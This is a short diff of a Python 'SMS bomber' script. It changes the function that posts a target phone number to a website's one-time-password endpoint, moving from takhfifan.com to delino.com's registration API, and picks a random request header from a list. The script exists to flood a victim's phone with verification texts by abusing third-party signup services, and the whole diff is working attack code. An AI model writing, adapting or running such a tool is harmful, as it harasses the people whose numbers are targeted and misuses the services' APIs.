@@ -9,17 +9,17 @@ heads = [
     },
 ]
 
-def pindo_bomber(number):
+def delino_bomber(number):
     random_choose = random.choice(heads)
-    pindo_api = 'https://takhfifan.com/ajax/account/existOtp'
-    json_request_api = {"phone":"0"+number}
+    delino_api = 'https://www.delino.com/user/register'
+    json_request_api = {"mobile":"0"+number}
     try:
-        req = requests.post(pindo_api,json=json_request_api,headers=random_choose)
-        if req.status_code == 200 or 201:
-            print('pindo code sent!')
+        req = requests.post(delino_api,json=json_request_api,headers=random_choose)
+        if req.status_code == 200:
+            print('delino Code Sent!')
         else:
-            print(f'pindo code: {req.status_code}')
+            print(f"delino code: {req.status_code}")
     except:
-        print('pindo error!')
+        print('delino error!')    
 
-pindo_bomber("")
+delino_bomber('')
